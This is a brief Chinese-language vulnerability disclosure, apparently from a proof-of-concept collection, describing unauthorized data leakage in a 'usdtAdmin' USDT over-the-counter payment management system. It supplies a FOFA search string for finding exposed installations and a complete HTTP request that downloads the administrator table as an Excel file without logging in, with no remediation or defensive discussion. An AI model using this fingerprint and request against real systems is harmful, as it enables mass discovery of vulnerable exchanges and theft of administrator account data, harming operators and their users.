# usdtAdmin收款管理系统存在excel敏感信息泄露

虚拟币买卖USDT场外交易所由于在鉴权方面存在疏漏，导致了可未授权访问，从而导致信息泄露

## fofa
```
"/usdtmerchant/login/reg.html"
```

## poc
```javascript
GET /index/getway/excel?down=1&table=ea_system_admin&shunxu=desc&number=100 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```
